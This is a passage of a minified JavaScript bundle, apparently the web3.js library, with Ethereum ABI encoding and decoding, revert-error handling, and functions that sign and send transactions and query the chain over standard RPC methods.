            l.dynamic ? (s.push(uc({
                type: "uint256",
                name: ""
            }, e + n)),
            o.push(l),
            n += l.encoded.length) : s.push(l);
        return nn(...s.map(l => l.encoded), ...o.map(l => l.encoded))
    }
    function TN(t, e) {
        if (!Array.isArray(e))
            throw new Ge("Expected value to be array",{
                abi: t,
                values: e
            });
        const {size: n, param: s} = O0(t)
          , o = e.map(d => Sp(s, d))
          , l = n === -1
          , u = o.length > 0 && o[0].dynamic;
        if (!l && e.length !== n)
            throw new Ge("Given arguments count doesn't match array length",{
                arrayLength: n,
                argumentsLength: e.length
            });
        if (l || u) {
            const d = E_(o);
            if (l) {
                const p = uc({
                    type: "uint256",
                    name: ""
                }, o.length).encoded;
                return {
                    dynamic: !0,
                    encoded: o.length > 0 ? nn(p, d) : p
                }
            }
            return {
                dynamic: !0,
                encoded: d
            }
        }
        return {
            dynamic: !1,
            encoded: nn(...o.map(d => d.encoded))
        }
    }
    function RN(t, e) {
        let {size: n, param: s} = O0(t);
        const o = n === -1;
        let l = 0;
        const u = [];
        let d = e;
        if (o) {
            const h = io({
                type: "uint32",
                name: ""
            }, e);
            n = Number(h.result),
            l = h.consumed,
            d = h.encoded
        }
        if (Ed(s)) {
            for (let h = 0; h < n; h += 1) {
                const m = io({
                    type: "uint32",
                    name: ""
                }, d.subarray(h * wt));
                l += m.consumed;
                const y = xd(s, d.subarray(Number(m.result)));
                l += y.consumed,
                u.push(y.result)
            }
            return {
                result: u,
                encoded: d.subarray(l),
                consumed: l
            }
        }
        for (let h = 0; h < n; h += 1) {
            const m = xd(s, e.subarray(l));
            l += m.consumed,
            u.push(m.result)
        }
        return {
            result: u,
            encoded: e.subarray(l),
            consumed: l
        }
    }
    function Sp(t, e) {
        if (t.type === "string")
            return xN(t, e);
        if (t.type === "bool")
            return wN(t, e);
        if (t.type === "address")
            return yN(t, e);
        if (t.type === "tuple")
            return N0(t, e);
        if (t.type.endsWith("]"))
            return TN(t, e);
        if (t.type.startsWith("bytes"))
            return w_(t, e);
        if (t.type.startsWith("uint") || t.type.startsWith("int"))
            return uc(t, e);
        throw new Ge("Unsupported",{
            param: t,
            value: e
        })
    }
    function xd(t, e) {
        if (t.type === "string")
            return SN(t, e);
        if (t.type === "bool")
            return _N(t, e);
        if (t.type === "address")
            return vN(t, e);
        if (t.type === "tuple")
            return x_(t, e);
        if (t.type.endsWith("]"))
            return RN(t, e);
        if (t.type.startsWith("bytes"))
            return __(t, e);
        if (t.type.startsWith("uint") || t.type.startsWith("int"))
            return io(t, e);
        throw new Ge("Unsupported",{
            param: t,
            bytes: e
        })
    }
    function N0(t, e) {
        var n, s, o;
        let l = !1;
        if (!Array.isArray(e) && typeof e != "object")
            throw new Ge("param must be either Array or Object",{
                param: t,
                input: e
            });
        const u = e
          , d = [];
        for (let p = 0; p < ((s = (n = t.components) === null || n === void 0 ? void 0 : n.length) !== null && s !== void 0 ? s : 0); p += 1) {
            const h = t.components[p];
            let m;
            if (Array.isArray(u)) {
                if (p >= u.length)
                    throw new Ge("input param length missmatch",{
                        param: t,
                        input: e
                    });
                m = Sp(h, u[p])
            } else {
                const y = u[(o = h.name) !== null && o !== void 0 ? o : ""];
                if (y == null)
                    throw new Ge("missing input defined in abi",{
                        param: t,
                        input: e,
                        paramName: h.name
                    });
                m = Sp(h, y)
            }
            m.dynamic && (l = !0),
            d.push(m)
        }
        return l ? {
            dynamic: !0,
            encoded: E_(d)
        } : {
            dynamic: !1,
            encoded: nn(...d.map(p => p.encoded))
        }
    }
    function x_(t, e) {
        const n = {
            __length__: 0
        };
        let s = 0;
        if (!t.components)
            return {
                result: n,
                encoded: e,
                consumed: s
            };
        let o = 0;
        for (const [l,u] of t.components.entries()) {
            let d;
            if (Ed(u)) {
                const p = io({
                    type: "uint32",
                    name: ""
                }, e.subarray(s));
                d = xd(u, e.subarray(Number(p.result))),
                s += p.consumed,
                o += d.consumed
            } else
                d = xd(u, e.subarray(s)),
                s += d.consumed;
            n.__length__ += 1,
            n[l] = d.result,
            u.name && u.name !== "" && (n[u.name] = d.result)
        }
        return {
            encoded: e.subarray(s + o),
            result: n,
            consumed: s + o
        }
    }
    function BN(t, e, n) {
        const s = y_(t)
          , o = Us(e);
        return x_({
            components: s
        }, o).result
    }
    function S_(t) {
        const e = [];
        return t.forEach(n => {
            if (Array.isArray(n)) {
                const s = S_(n);
                e.push({
                    type: "tuple",
                    components: s,
                    name: ""
                })
            } else
                e.push({
                    type: ir(n, !0)
                })
        }
        ),
        e
    }
    function rf(t, e) {
        if (t?.length !== e.length)
            throw new Ge("Invalid number of values received for given ABI",{
                expected: t?.length,
                received: e.length
            });
        const n = y_(t);
        return sr(N0({
            type: "tuple",
            name: "",
            components: n
        }, e).encoded)
    }
    function CN(t) {
        try {
            const e = S_(t);
            return sr(N0({
                type: "tuple",
                name: "",
                components: e
            }, t).encoded)
        } catch {
            throw new Ge("Could not infer types from given params",{
                params: t
            })
        }
    }
    const Tp = (t, e) => rf([t], [e])
      , T_ = (t, e, n) => {
        try {
            if (t.length > 0 && (!e || e === "0x" || e === "0X"))
                throw new Ge("Returned values aren't valid, did it run Out of Gas? You might also see this error if you are not using the correct ABI for the contract you are retrieving data from, requesting data from a block number that does not exist, or querying a node which is not fully synced.");
            return BN(t, `0x${e.replace(/0x/i, "")}`, n)
        } catch (s) {
            throw new Ge(`Parameter decoding error: ${s.message}`,{
                internalErr: s
            })
        }
    }
      , xs = (t, e) => T_(t, e, !1)
      , R_ = (t, e) => xs([t], e)[0]
      , Kl = t => {
        if (typeof t != "string" && !nf(t))
            throw new Ge("Invalid parameter value in encodeFunctionSignature");
        let e;
        return t && (typeof t == "function" || typeof t == "object") ? e = $i(t) : e = t,
        Tn(e).slice(0, 10)
    }
      , IN = (t, e) => {
        var n;
        if (!nf(t))
            throw new Ge("Invalid parameter value in encodeFunctionCall");
        return `${Kl(t)}${rf((n = t.inputs) !== null && n !== void 0 ? n : [], e ?? []).replace("0x", "")}`
    }
      , Rp = (t, e, n=!0) => {
        const s = n && e && e.length >= 10 && e.startsWith("0x") ? e.slice(10) : e;
        if (!t.inputs)
            throw new Wt("No inputs found in the ABI");
        const o = xs([...t.inputs], s);
        return Object.assign(Object.assign({}, o), {
            __method__: $i(t)
        })
    }
      , kN = (t, e) => {
        if (t.type === "constructor")
            return e;
        if (!e)
            return null;
        const n = e.length >= 2 ? e.slice(2) : e;
        if (!t.outputs)
            return null;
        const s = xs([...t.outputs], n);
        return s.__length__ === 1 ? s[0] : s
    }
      , ON = ["bool", "string", "int", "uint", "address", "fixed", "ufixed"]
      , NN = (t, e) => t === "string" ? e : R_(t, e)
      , B_ = (t, e, n) => {
        const s = Array.isArray(n) ? n : [n]
          , o = {}
          , l = {};
        for (const [w,E] of t.entries())
            E.indexed ? o[w] = E : l[w] = E;
        const u = e ? T_(Object.values(l), e, !0) : {
            __length__: 0
        }
          , d = s.length - Object.keys(o).length
          , p = Object.values(o).map( (w, E) => ON.some(S => w.type.startsWith(S)) ? NN(w.type, s[E + d]) : s[E + d])
          , h = {
            __length__: 0
        };
        let m = 0
          , y = 0;
        for (const [w,E] of t.entries())
            h[w] = E.type === "string" ? "" : void 0,
            o[w] && (h[w] = p[m],
            m += 1),
            l[w] && (h[w] = u[String(y)],
            y += 1),
            E.name && (h[E.name] = h[w]),
            h.__length__ += 1;
        return h
    }
      , Uu = (t, e) => {
        if (e?.data) {
            let n, s, o;
            try {
                const l = e.data.slice(0, 10)
                  , u = t.find(d => WO(d).startsWith(l));
                u?.inputs ? (n = u.name,
                s = $i(u),
                o = xs([...u.inputs], e.data.substring(10))) : e.data.startsWith("0x08c379a0") ? (n = "Error",
                s = "Error(string)",
                o = xs([{
                    name: "message",
                    type: "string"
                }], e.data.substring(10))) : e.data.startsWith("0x4e487b71") ? (n = "Panic",
                s = "Panic(uint256)",
                o = xs([{
                    name: "code",
                    type: "uint256"
                }], e.data.substring(10))) : console.error("No matching error abi found for error data", e.data)
            } catch (l) {
                console.error(l)
            }
            n && e.setDecodedProperties(n, s, o)
        }
    }
    ;
    var MN = function(t, e, n, s) {
        function o(l) {
            return l instanceof n ? l : new n(function(u) {
                u(l)
            }
            )
        }
        return new (n || (n = Promise))(function(l, u) {
            function d(m) {
                try {
                    h(s.next(m))
                } catch (y) {
                    u(y)
                }
            }
            function p(m) {
                try {
                    h(s.throw(m))
                } catch (y) {
                    u(y)
                }
            }
            function h(m) {
                m.done ? l(m.value) : o(m.value).then(d, p)
            }
            h((s = s.apply(t, e || [])).next())
        }
        )
    };
    const DN = (t, e) => {
        var n, s, o, l, u;
        if (t instanceof As && t.cause instanceof Dd) {
            if (e !== void 0) {
                const d = e.filter(p => tf(p));
                return Uu(d, t.cause),
                {
                    reason: t.cause.message,
                    signature: (n = t.cause.data) === null || n === void 0 ? void 0 : n.slice(0, 10),
                    data: (s = t.cause.data) === null || s === void 0 ? void 0 : s.substring(10),
                    customErrorName: t.cause.errorName,
                    customErrorDecodedSignature: t.cause.errorSignature,
                    customErrorArguments: t.cause.errorArgs
                }
            }
            return {
                reason: t.cause.message,
                signature: (o = t.cause.data) === null || o === void 0 ? void 0 : o.slice(0, 10),
                data: (l = t.cause.data) === null || l === void 0 ? void 0 : l.substring(10)
            }
        }
        if (t instanceof Ld && !Array.isArray((u = t.cause) === null || u === void 0 ? void 0 : u.errors) && t.cause !== void 0)
            return t.cause.message;
        throw t
    }
    ;
    function C_(t, e, n) {
        return MN(this, arguments, void 0, function*(s, o, l, u=s.defaultReturnFormat) {
            try {
                yield U0(s, o, s.defaultBlock, u);
                return
            } catch (d) {
                return DN(d, l)
            }
        })
    }
    var LN = function(t, e, n, s) {
        function o(l) {
            return l instanceof n ? l : new n(function(u) {
                u(l)
            }
            )
        }
        return new (n || (n = Promise))(function(l, u) {
            function d(m) {
                try {
                    h(s.next(m))
                } catch (y) {
                    u(y)
                }
            }
            function p(m) {
                try {
                    h(s.throw(m))
                } catch (y) {
                    u(y)
                }
            }
            function h(m) {
                m.done ? l(m.value) : o(m.value).then(d, p)
            }
            h((s = s.apply(t, e || [])).next())
        }
        )
    };
    function Zm(t, e, n, s, o, l) {
        return LN(this, void 0, void 0, function*() {
            let u = l;
            u === void 0 && t.handleRevert && e !== void 0 && (u = yield C_(t, e, o));
            let d;
            if (u === void 0)
                d = new y1(n);
            else if (typeof u == "string")
                d = new Wu(u,void 0,n);
            else if (u.customErrorName !== void 0 && u.customErrorDecodedSignature !== void 0 && u.customErrorArguments !== void 0) {
                const p = u;
                d = new g1(p.reason,p.customErrorName,p.customErrorDecodedSignature,p.customErrorArguments,p.signature,n,p.data)
            } else
                d = new Wu(u.reason,u.signature,n,u.data);
            return d
        })
    }
    const M0 = (t, e, n, s=$t) => {
        var o, l, u, d, p, h;
        let m = Object.assign({}, t);
        const y = ee(co, e, s);
        if ([no, "allEvents"].includes(m.name)) {
            const E = n.find(S => S.signature === e.topics[0]);
            E ? m = E : m = {
                anonymous: !0
            }
        }
        if (m.inputs = (l = (o = m.inputs) !== null && o !== void 0 ? o : t.inputs) !== null && l !== void 0 ? l : [],
        !m.anonymous) {
            let E = 0;
            ((u = m.inputs) !== null && u !== void 0 ? u : []).forEach(S => {
                S.indexed && (E += 1)
            }
            ),
            E > 0 && e?.topics && e?.topics.length !== E + 1 && (m = Object.assign(Object.assign({}, m), {
                anonymous: !0,
                inputs: []
            }))
        }
        const w = m.anonymous ? e.topics : ((d = e.topics) !== null && d !== void 0 ? d : []).slice(1);
        return Object.assign(Object.assign({}, y), {
            returnValues: B_([...(p = m.inputs) !== null && p !== void 0 ? p : []], e.data, w),
            event: m.name,
            signature: !m.anonymous && ((h = e.topics) === null || h === void 0 ? void 0 : h.length) > 0 && e.topics[0] ? e.topics[0] : void 0,
            raw: {
                data: e.data,
                topics: e.topics
            }
        })
    }
    ;
    var ds = function(t, e, n, s) {
        function o(l) {
            return l instanceof n ? l : new n(function(u) {
                u(l)
            }
            )
        }
        return new (n || (n = Promise))(function(l, u) {
            function d(m) {
                try {
                    h(s.next(m))
                } catch (y) {
                    u(y)
                }
            }
            function p(m) {
                try {
                    h(s.throw(m))
                } catch (y) {
                    u(y)
                }
            }
            function h(m) {
                m.done ? l(m.value) : o(m.value).then(d, p)
            }
            h((s = s.apply(t, e || [])).next())
        }
        )
    };
    class I_ {
        constructor({options: e, web3Context: n, promiEvent: s, returnFormat: o}) {
            this.options = {
                checkRevertBeforeSending: !0
            },
            this.options = e,
            this.web3Context = n,
            this.promiEvent = s,
            this.returnFormat = o
        }
        getReceiptWithEvents(e) {
            var n, s;
            const o = Object.assign({}, e ?? {});
            if (!((n = this.options) === null || n === void 0) && n.contractAbi && o.logs && o.logs.length > 0) {
                o.events = {};
                for (const l of o.logs) {
                    const u = M0(bp, l, (s = this.options) === null || s === void 0 ? void 0 : s.contractAbi, this.returnFormat);
                    u.event && (o.events[u.event] = u)
                }
            }
            return o
        }
        checkRevertBeforeSending(e) {
            return ds(this, void 0, void 0, function*() {
                if (this.options.checkRevertBeforeSending !== !1) {
                    let n = e;
                    q(e.data) && q(e.input) && q(e.gas) && (n = Object.assign(Object.assign({}, e), {
                        gas: 21e3
                    }));
                    const s = yield C_(this.web3Context, n, this.options.contractAbi);
                    if (s !== void 0)
                        throw yield Zm(this.web3Context, e, void 0, void 0, this.options.contractAbi, s)
                }
            })
        }
        emitSending(e) {
            this.promiEvent.listenerCount("sending") > 0 && this.promiEvent.emit("sending", e)
        }
        populateGasPrice(e) {
            return ds(this, arguments, void 0, function*({transactionFormatted: n, transaction: s}) {
                var o;
                let l = n;
                return !this.web3Context.config.ignoreGasPricing && !(!((o = this.options) === null || o === void 0) && o.ignoreGasPricing) && q(n.gasPrice) && (q(s.maxPriorityFeePerGas) || q(s.maxFeePerGas)) && (l = Object.assign(Object.assign({}, n), yield i_(n, this.web3Context, Ce))),
                l
            })
        }
        signAndSend(e) {
            return ds(this, arguments, void 0, function*({wallet: n, tx: s}) {
                if (n) {
                    const o = yield n.signTransaction(s);
                    return _p(this.web3Context, () => ds(this, void 0, void 0, function*() {
                        return Jw(this.web3Context.requestManager, o.rawTransaction)
                    }), o.transactionHash)
                }
                return _p(this.web3Context, () => ds(this, void 0, void 0, function*() {
                    return Gk(this.web3Context.requestManager, s)
                }))
            })
        }
        emitSent(e) {
            this.promiEvent.listenerCount("sent") > 0 && this.promiEvent.emit("sent", e)
        }
        emitTransactionHash(e) {
            this.promiEvent.listenerCount("transactionHash") > 0 && this.promiEvent.emit("transactionHash", e)
        }
        emitReceipt(e) {
            this.promiEvent.listenerCount("receipt") > 0 && this.promiEvent.emit("receipt", e)
        }
        handleError(e) {
            return ds(this, arguments, void 0, function*({error: n, tx: s}) {
                var o;
                let l = n;
                return l instanceof As && this.web3Context.handleRevert && (l = yield Zm(this.web3Context, s, void 0, void 0, (o = this.options) === null || o === void 0 ? void 0 : o.contractAbi)),
                (l instanceof Ld || l instanceof As || l instanceof g1 || l instanceof y1 || l instanceof Wu || l instanceof w1) && this.promiEvent.listenerCount("error") > 0 && this.promiEvent.emit("error", l),
                l
            })
        }
        emitConfirmation({receipt: e, transactionHash: n, customTransactionReceiptSchema: s}) {
            this.promiEvent.listenerCount("confirmation") > 0 && XO(this.web3Context, this.promiEvent, e, n, this.returnFormat, s)
        }
        handleResolve(e) {
            return ds(this, arguments, void 0, function*({receipt: n, tx: s}) {
                var o, l, u;
                if (!((o = this.options) === null || o === void 0) && o.transactionResolver)
                    return (l = this.options) === null || l === void 0 ? void 0 : l.transactionResolver(n);
                if (n.status === BigInt(0)) {
                    const d = yield Zm(this.web3Context, s, n, void 0, (u = this.options) === null || u === void 0 ? void 0 : u.contractAbi);
                    throw this.promiEvent.listenerCount("error") > 0 && this.promiEvent.emit("error", d),
                    d
                } else
                    return n
            })
        }
    }
    var Je = function(t, e, n, s) {
        function o(l) {
            return l instanceof n ? l : new n(function(u) {
                u(l)
            }
            )
        }
        return new (n || (n = Promise))(function(l, u) {
            function d(m) {
                try {
                    h(s.next(m))
                } catch (y) {
                    u(y)
                }
            }
            function p(m) {
                try {
                    h(s.throw(m))
                } catch (y) {
                    u(y)
                }
            }
            function h(m) {
                m.done ? l(m.value) : o(m.value).then(d, p)
            }
            h((s = s.apply(t, e || [])).next())
        }
        )
    }
      , UN = function(t, e) {
        var n = {};
        for (var s in t)
            Object.prototype.hasOwnProperty.call(t, s) && e.indexOf(s) < 0 && (n[s] = t[s]);
        if (t != null && typeof Object.getOwnPropertySymbols == "function")
            for (var o = 0, s = Object.getOwnPropertySymbols(t); o < s.length; o++)
                e.indexOf(s[o]) < 0 && Object.prototype.propertyIsEnumerable.call(t, s[o]) && (n[s[o]] = t[s[o]]);
        return n
    };
    const jN = t => Je(void 0, void 0, void 0, function*() {
        return Xw(t.requestManager)
    });
    function PN(t, e) {
        return Je(this, void 0, void 0, function*() {
            const n = yield Rk(t.requestManager);
            return ee({
                format: "uint"
            }, n, e ?? t.defaultReturnFormat)
        })
    }
    function D0(t, e) {
        return Je(this, void 0, void 0, function*() {
            const n = yield Bk(t.requestManager);
            return ee({
                format: "uint"
            }, n, e ?? t.defaultReturnFormat)
        })
    }
    function HN(t, e) {
        return Je(this, void 0, void 0, function*() {
            const n = yield Ck(t.requestManager);
            return ee({
                format: "uint"
            }, n, e ?? t.defaultReturnFormat)
        })
    }
    function L0(t, e) {
        return Je(this, void 0, void 0, function*() {
            const n = yield kk(t.requestManager);
            return ee({
                format: "uint"
            }, n, e ?? t.defaultReturnFormat)
        })
    }
    function zN(t, e) {
        return Je(this, arguments, void 0, function*(n, s, o=n.defaultBlock, l) {
            const u = jt(o) ? o : ee({
                format: "uint"
            }, o, Ce)
              , d = yield Ok(n.requestManager, s, u);
            return ee({
                format: "uint"
            }, d, l ?? n.defaultReturnFormat)
        })
    }
    function GN(t, e, n) {
        return Je(this, arguments, void 0, function*(s, o, l, u=s.defaultBlock, d) {
            const p = ee({
                format: "uint"
            }, l, Ce)
              , h = jt(u) ? u : ee({
                format: "uint"
            }, u, Ce)
              , m = yield Nk(s.requestManager, o, p, h);
            return ee({
                format: "bytes"
            }, m, d ?? s.defaultReturnFormat)
        })
    }
    function qN(t, e) {
        return Je(this, arguments, void 0, function*(n, s, o=n.defaultBlock, l) {
            const u = jt(o) ? o : ee({
                format: "uint"
            }, o, Ce)
              , d = yield Pk(n.requestManager, s, u);
            return ee({
                format: "bytes"
            }, d, l ?? n.defaultReturnFormat)
        })
    }
    function k_(t) {
        return Je(this, arguments, void 0, function*(e, n=e.defaultBlock, s=!1, o) {
            var l;
            let u;
            if (Fr(n)) {
                const p = ee({
                    format: "bytes32"
                }, n, Ce);
                u = yield Qk(e.requestManager, p, s)
            } else {
                const p = jt(n) ? n : ee({
                    format: "uint"
                }, n, Ce);
                u = yield $w(e.requestManager, p, s)
            }
            const d = ee(wd, u, o ?? e.defaultReturnFormat);
            return q(d) ? d : Object.assign(Object.assign({}, d), {
                transactions: (l = d.transactions) !== null && l !== void 0 ? l : []
            })
        })
    }
    function FN(t) {
        return Je(this, arguments, void 0, function*(e, n=e.defaultBlock, s) {
            let o;
            if (Fr(n)) {
                const l = ee({
                    format: "bytes32"
                }, n, Ce);
                o = yield Dk(e.requestManager, l)
            } else {
                const l = jt(n) ? n : ee({
                    format: "uint"
                }, n, Ce);
                o = yield Lk(e.requestManager, l)
            }
            return ee({
                format: "uint"
            }, o, s ?? e.defaultReturnFormat)
        })
    }
    function QN(t) {
        return Je(this, arguments, void 0, function*(e, n=e.defaultBlock, s) {
            let o;
            if (Fr(n)) {
                const l = ee({
                    format: "bytes32"
                }, n, Ce);
                o = yield Uk(e.requestManager, l)
            } else {
                const l = jt(n) ? n : ee({
                    format: "uint"
                }, n, Ce);
                o = yield jk(e.requestManager, l)
            }
            return ee({
                format: "uint"
            }, o, s ?? e.defaultReturnFormat)
        })
    }
    function VN(t) {
        return Je(this, arguments, void 0, function*(e, n=e.defaultBlock, s, o) {
            const l = ee({
                format: "uint"
            }, s, Ce);
            let u;
            if (Fr(n)) {
                const d = ee({
                    format: "bytes32"
                }, n, Ce);
                u = yield Xk(e.requestManager, d, l)
            } else {
                const d = jt(n) ? n : ee({
                    format: "uint"
                }, n, Ce);
                u = yield Jk(e.requestManager, d, l)
            }
            return ee(wd, u, o ?? e.defaultReturnFormat)
        })
    }
    function YN(t, e) {
        return Je(this, arguments, void 0, function*(n, s, o=n.defaultReturnFormat) {
            const l = ee({
                format: "bytes32"
            }, s, $t)
              , u = yield Vk(n.requestManager, l);
            return q(u) ? u : pn(u, o, {
                transactionSchema: n.config.customTransactionSchema,
                fillInputAndData: !0
            })
        })
    }
    function ZN(t, e) {
        return Je(this, void 0, void 0, function*() {
            return (yield lO(t.requestManager)).map(s => pn(s, e ?? t.defaultReturnFormat, {
                transactionSchema: t.config.customTransactionSchema,
                fillInputAndData: !0
            }))
        })
    }
    function KN(t) {
        return Je(this, arguments, void 0, function*(e, n=e.defaultBlock, s, o) {
            const l = ee({
                format: "uint"
            }, s, Ce);
            let u;
            if (Fr(n)) {
                const d = ee({
                    format: "bytes32"
                }, n, Ce);
                u = yield Yk(e.requestManager, d, l)
            } else {
                const d = jt(n) ? n : ee({
                    format: "uint"
                }, n, Ce);
                u = yield Zk(e.requestManager, d, l)
            }
            return q(u) ? u : pn(u, o ?? e.defaultReturnFormat, {
                transactionSchema: e.config.customTransactionSchema,
                fillInputAndData: !0
            })
        })
    }
    function O_(t, e, n) {
        return Je(this, void 0, void 0, function*() {
            const s = ee({
                format: "bytes32"
            }, e, $t);
            let o;
            try {
                o = yield Kk(t.requestManager, s)
            } catch (l) {
                if (typeof l == "object" && !q(l) && "message"in l && l.message === "transaction indexing is in progress")
                    console.warn("Transaction indexing is in progress.");
                else
                    throw l
            }
            return q(o) ? o : ee(uo, o, n ?? t.defaultReturnFormat)
        })
    }
    function N_(t, e) {
        return Je(this, arguments, void 0, function*(n, s, o=n.defaultBlock, l) {
            const u = jt(o) ? o : ee({
                format: "uint"
            }, o, Ce)
              , d = yield Mk(n.requestManager, s, u);
            return ee({
                format: "uint"
            }, d, l ?? n.defaultReturnFormat)
        })
    }
    function Xl(t, e, n, s={
        checkRevertBeforeSending: !0
    }, o) {
        const l = new Kw( (u, d) => {
            setImmediate( () => {
                Je(this, void 0, void 0, function*() {
                    const p = new I_({
                        web3Context: t,
                        promiEvent: l,
                        options: s,
                        returnFormat: n
                    });
                    let h = Object.assign({}, e);
                    q(o) || (h = yield o.processTransaction(h));
                    let m = pn(Object.assign(Object.assign({}, h), {
                        from: Ap("from", t, h),
                        to: Ap("to", t, h)
                    }), Ce, {
                        transactionSchema: t.config.customTransactionSchema
                    });
                    try {
                        m = yield p.populateGasPrice({
                            transaction: h,
                            transactionFormatted: m
                        }),
                        yield p.checkRevertBeforeSending(m),
                        p.emitSending(m);
                        let y;
                        t.wallet && !q(m.from) && (y = t.wallet.get(m.from));
                        const w = yield p.signAndSend({
                            wallet: y,
                            tx: m
                        })
                          , E = ee({
                            format: "bytes32"
                        }, w, n ?? t.defaultReturnFormat);
                        p.emitSent(m),
                        p.emitTransactionHash(E);
                        const S = yield a_(t, w, n ?? t.defaultReturnFormat)
                          , _ = p.getReceiptWithEvents(ee(uo, S, n ?? t.defaultReturnFormat));
                        p.emitReceipt(_),
                        u(yield p.handleResolve({
                            receipt: _,
                            tx: m
                        })),
                        p.emitConfirmation({
                            receipt: _,
                            transactionHash: w
                        })
                    } catch (y) {
                        d(yield p.handleError({
                            error: y,
                            tx: m
                        }))
                    }
                })
            }
            )
        }
        );
        return l
    }
    function XN(t, e, n, s={
        checkRevertBeforeSending: !0
    }) {
        const o = new Kw( (l, u) => {
            setImmediate( () => {
                Je(this, void 0, void 0, function*() {
                    const d = new I_({
                        web3Context: t,
                        promiEvent: o,
                        options: s,
                        returnFormat: n
                    })
                      , p = ee({
                        format: "bytes"
                    }, e, Ce)
                      , h = Ds.fromSerializedData(Ai(lt(p)))
                      , m = Object.assign(Object.assign({}, h.toJSON()), {
                        from: h.getSenderAddress().toString()
                    });
                    try {
                        const {v: y, r: w, s: E} = m
                          , S = UN(m, ["v", "r", "s"]);
                        yield d.checkRevertBeforeSending(S),
                        d.emitSending(p);
                        const _ = yield _p(t, () => Je(this, void 0, void 0, function*() {
                            return Jw(t.requestManager, p)
                        }));
                        d.emitSent(p);
                        const x = ee({
                            format: "bytes32"
                        }, _, n ?? t.defaultReturnFormat);
                        d.emitTransactionHash(x);
                        const b = yield a_(t, _, n ?? t.defaultReturnFormat)
                          , I = d.getReceiptWithEvents(ee(uo, b, n ?? t.defaultReturnFormat));
                        d.emitReceipt(I),
                        l(yield d.handleResolve({
                            receipt: I,
                            tx: m
                        })),
                        d.emitConfirmation({
                            receipt: I,
                            transactionHash: _
                        })
                    } catch (y) {
                        u(yield d.handleError({
                            error: y,
                            tx: m
                        }))
                    }
                })
            }
            )
        }
        );
        return o
    }
    function JN(t, e, n) {
        return Je(this, arguments, void 0, function*(s, o, l, u=s.defaultReturnFormat) {
            var d;
            const p = ee({
                format: "bytes"
            }, o, $t);
            if (!((d = s.wallet) === null || d === void 0) && d.get(l)) {
                const y = s.wallet.get(l).sign(p);
                return ee(DO, y, u)
            }
            if (typeof l == "number")
                throw new JT(o,'RPC method "eth_sign" does not support index signatures');
            const h = yield Hk(s.requestManager, l, p);
            return ee({
                format: "bytes"
            }, h, u)
        })
    }
    function $N(t, e) {
        return Je(this, arguments, void 0, function*(n, s, o=n.defaultReturnFormat) {
            const l = yield zk(n.requestManager, pn(s, Ce, {
                transactionSchema: n.config.customTransactionSchema
            }));
            return Xp(l) ? PO(l, o, {
                fillInputAndData: !0
            }) : {
                raw: ee({
                    format: "bytes"
                }, l.raw, o),
                tx: pn(l.tx, o, {
                    transactionSchema: n.config.customTransactionSchema,
                    fillInputAndData: !0
                })
            }
        })
    }
    function U0(t, e) {
        return Je(this, arguments, void 0, function*(n, s, o=n.defaultBlock, l=n.defaultReturnFormat) {
            const u = jt(o) ? o : ee({
                format: "uint"
            }, o, Ce)
              , d = yield qk(n.requestManager, pn(s, Ce, {
                transactionSchema: n.config.customTransactionSchema
            }), u);
            return ee({
                format: "bytes"
            }, d, l)
        })
    }
    function j0(t, e) {
        return Je(this, arguments, void 0, function*(n, s, o=n.defaultBlock, l) {
            const u = pn(s, Ce, {
                transactionSchema: n.config.customTransactionSchema
            })
              , d = jt(o) ? o : ee({
                format: "uint"
            }, o, Ce)
              , p = yield Fk(n.requestManager, u, d);
            return ee({
                format: "uint"
            }, p, l ?? n.defaultReturnFormat)
        })
    }
    function M_(t, e, n) {
        return Je(this, void 0, void 0, function*() {
            let {toBlock: s, fromBlock: o} = e;
            q(s) || (typeof s == "number" || typeof s == "bigint") && (s = kt(s)),
            q(o) || (typeof o == "number" || typeof o == "bigint") && (o = kt(o));
            const l = Object.assign(Object.assign({}, e), {
                fromBlock: o,
                toBlock: s
            });
            return (yield rO(t.requestManager, l)).map(p => typeof p == "string" ? p : ee(co, p, n ?? t.defaultReturnFormat))
        })
    }
    function D_(t, e) {
        return Je(this, void 0, void 0, function*() {
            const n = yield uO(t.requestManager);
            return ee({
                format: "uint"
            }, n, e ?? t.defaultReturnFormat)
        })
    }
    function WN(t, e, n) {
        return Je(this, arguments, void 0, function*(s, o, l, u=s.defaultBlock, d) {
            const p = l.map(y => ee({
                format: "bytes"
            }, y, Ce))
              , h = jt(u) ? u : ee({
                format: "uint"
            }, u, Ce)
              , m = yield dO(s.requestManager, o, p, h);
            return ee(jO, m, d ?? s.defaultReturnFormat)
        })
    }
    function eM(t, e) {
        return Je(this, arguments, void 0, function*(n, s, o=n.defaultBlock, l, u) {
            const d = ee({
                format: "uint"
            }, s, Ce)
              , p = jt(o) ? o : ee({
                format: "uint"
            }, o, Ce)
              , h = ee({
                type: "array",
                items: {
                    format: "uint"
                }
            }, l, ef)
              , m = yield oO(n.requestManager, d, p, h);
            return ee(LO, m, u ?? n.defaultReturnFormat)
        })
    }
    function L_(t, e) {
        return Je(this, arguments, void 0, function*(n, s, o=n.defaultBlock, l) {
            const u = jt(o) ? o : ee({
                format: "uint"
            }, o, Ce)
              , d = yield hO(n.requestManager, pn(s, Ce, {
                transactionSchema: n.config.customTransactionSchema
            }), u);
            return ee(kO, d, l ?? n.defaultReturnFormat)
        })
    }
    function tM(t, e, n, s, o) {
        return Je(this, void 0, void 0, function*() {
            const l = yield mO(t.requestManager, e, n, s);
            return ee({
                format: "bytes"
            }, l, o ?? t.defaultReturnFormat)
        })
    }
    var fo = function(t, e, n, s) {
        function o(l) {
            return l instanceof n ? l : new n(function(u) {
                u(l)
            }
            )
        }
        return new (n || (n = Promise))(function(l, u) {
            function d(m) {
                try {
                    h(s.next(m))
                } catch (y) {
                    u(y)
                }
            }
            function p(m) {
                try {
                    h(s.throw(m))
                } catch (y) {
                    u(y)
                }
            }
            function h(m) {
                m.done ? l(m.value) : o(m.value).then(d, p)
            }
            h((s = s.apply(t, e || [])).next())
        }
        )
    };
    function nM(t, e) {
        return fo(this, void 0, void 0, function*() {
            const n = yield eO(t.requestManager);
            return ee({
                format: "uint"
            }, n, e ?? t.defaultReturnFormat)
        })
    }
    function iM(t, e, n) {
        return fo(this, void 0, void 0, function*() {
            let {toBlock: s, fromBlock: o} = e;
            q(s) || (typeof s == "number" || typeof s == "bigint") && (s = kt(s)),
            q(o) || (typeof o == "number" || typeof o == "bigint") && (o = kt(o));
            const l = Object.assign(Object.assign({}, e), {
                fromBlock: o,
                toBlock: s
            })
              , u = yield $k(t.requestManager, l);
            return ee({
                format: "uint"
            }, u, n ?? t.defaultReturnFormat)
        })
    }
    function rM(t, e) {
